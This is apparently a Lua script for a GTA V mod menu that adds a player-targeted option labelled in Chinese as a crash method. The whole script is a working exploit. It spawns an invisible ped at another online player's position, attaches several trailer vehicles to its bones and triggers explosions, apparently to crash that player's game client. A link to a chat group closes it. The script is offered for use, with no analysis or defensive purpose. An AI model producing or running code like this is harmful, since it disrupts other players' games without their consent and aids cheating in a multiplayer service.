util.keep_running()
util.require_natives("natives-1663599433")


 



function CreateVehicle(Hash, Pos, Heading, Invincible)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_vehicle(Hash, Pos, Heading)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    if Invincible then
        ENTITY.SET_ENTITY_INVINCIBLE(SpawnedVehicle, true)
    end
    return SpawnedVehicle
end

function CreateObject(Hash, Pos, static)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_object(Hash, Pos)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    if static then
        ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicle, true)
    end
    return SpawnedVehicle
end

function CreatePed(index, Hash, Pos, Heading)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_ped(index, Hash, Pos, Heading)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    return SpawnedVehicle
end


local function player(pid) 
menu.divider(menu.player_root(pid), "xipro专崩")
    
	

    local crash = menu.list(menu.player_root(pid), "选择你的崩溃方式", {}, "")
    menu.action(crash, "开崩", {"crash_xipro=>"}, "一时兴起，先放这一个", function()
            local model_array = {util.joaat("boattrailer"),util.joaat("trailersmall"),util.joaat("raketrailer"),}
                    local BAD_attach = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
                    local fuck_ped = CreatePed(26 , util.joaat("ig_kaylee"), BAD_attach, 0)
                    ENTITY.SET_ENTITY_VISIBLE(fuck_ped, false)
                    for i = 1, 3, 1 do
                        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(fuck_ped, BAD_attach.x, BAD_attach.y, BAD_attach.z)
                        for spawn, value in pairs(model_array) do
                            local vels = {}
                            vels[spawn] = CreateVehicle(value, BAD_attach, 0)
                            for attach, value in pairs(vels) do
                                ENTITY.ATTACH_ENTITY_BONE_TO_ENTITY_BONE_Y_FORWARD(value, fuck_ped, 0, 0, true, true)
                            end
                        end
                        util.yield(500)
                        menu.trigger_commands("explode" ..  players.get_name(pid))
                    end
					end)

	

end
players.on_join(player)
players.dispatch_on_join()
menu.divider(menu.my_root()," ")
menu.divider(menu.my_root(),"崩溃在玩家列表里选择玩家,划到最底下")
menu.divider(menu.my_root()," ")
menu.hyperlink(menu.my_root(), "南瓜的GTA5交流群 点击加入", "https://jq.qq.com/?_wv=1027&k=gl4IRi7a")